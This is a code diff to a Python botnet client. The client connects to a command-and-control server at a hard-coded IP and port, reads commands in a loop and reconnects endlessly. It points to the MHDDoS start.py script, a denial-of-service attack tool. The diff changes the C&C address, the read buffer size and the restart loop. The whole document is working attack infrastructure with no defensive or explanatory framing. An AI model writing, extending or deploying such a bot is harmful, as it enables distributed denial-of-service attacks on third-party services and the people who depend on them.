@@ -5,15 +5,15 @@ import asyncio
 import time
 import subprocess
 import os
-import uuid
 
 CUR_DIR = os.path.dirname(os.path.realpath(__file__))
 MHDDoS = os.sep + 'MHDDoS' + os.sep + 'start.py'
-TEST_CNC = "10.11.45.53"
+#  MHDDoS = '/home/frankwu/code/' + 'MHDDoS' + os.sep + 'start.py'
+TEST_CNC = "192.168.100.4"
 TEST_CNC_PORT = 9999
 
 async def start_bot():
-    bot_name = 'bot-' + str(uuid.uuid4())
+    bot_name = os.path.basename(__file__)
     # change IP to cnc server
     try:
         reader, writer = await asyncio.wait_for(asyncio.open_connection(TEST_CNC, TEST_CNC_PORT),
@@ -26,7 +26,7 @@ async def start_bot():
     await writer.drain()
     print('Connected to C&C Server')
     while True:
-        data = await reader.read(1024)
+        data = await reader.read(4096)
         if not data:
             break
         message = data.decode()
@@ -40,9 +40,11 @@ async def start_bot():
 
 def main():
     while True:
-        asyncio.run(start_bot())
-        print('bot is disconected, will restart again')
-        time.sleep(20)
+        try:
+            asyncio.run(start_bot())
+        finally:
+            print('bot is disconected, will restart again')
+            time.sleep(10)
 
 if __name__ == "__main__":
     main()
